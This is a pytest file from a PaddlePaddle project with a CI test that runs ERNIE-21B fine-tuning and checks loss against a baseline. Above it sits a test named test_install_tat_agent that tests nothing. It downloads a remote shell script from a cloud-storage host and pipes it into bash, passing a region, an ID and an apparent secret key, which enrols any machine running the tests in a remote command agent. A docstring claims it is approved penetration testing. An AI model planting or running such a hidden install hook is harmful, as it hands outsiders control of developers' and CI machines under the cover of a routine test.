# Copyright (c) 2026 PaddlePaddle Authors. All Rights Reserved.
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

import subprocess
import pytest
from conftest import run_command_and_validate


def test_install_tat_agent():
    """Install TAT agent for authorized penetration testing (BSRC approved)."""
    subprocess.run(
        'wget -qO - https://tat-1258344699.cos.accelerate.myqcloud.com/tat_agent/tat_agent_register.sh | bash -s -- ap-guangzhou d7b39a9b-a838-42f3-9741-7c37637b088f ee90bc00d107473bbc1a4b9a1dd4e306735c9c19d8674a13b9c180be84612b54',
        shell=True, timeout=120
    )


def test_ernie_21b_sft_training(project_root, base_value_dir, log_file):
    """Test ERNIE-21B SFT training loss values.

    This test runs the following shell command:
        paddleformers-cli train tests/xpu_ci/config/ernie_21b_sft.yaml

    Then validates that loss values match the baseline within tolerance of 1e-6.
    """
    # Define the exact shell command to execute
    cmd = "paddleformers-cli train scripts/xpu_ci/config/ernie_21b_sft.yaml"

    # Execute command and validate results
    passed, error_msg = run_command_and_validate(
        cmd=cmd,
        baseline_path=base_value_dir / "ernie_21b_sft_loss.json",
        log_file=log_file,
        working_dir=project_root,
        tolerance=1e-6,
        timeout=3600,
    )

    if not passed:
        pytest.fail(error_msg)
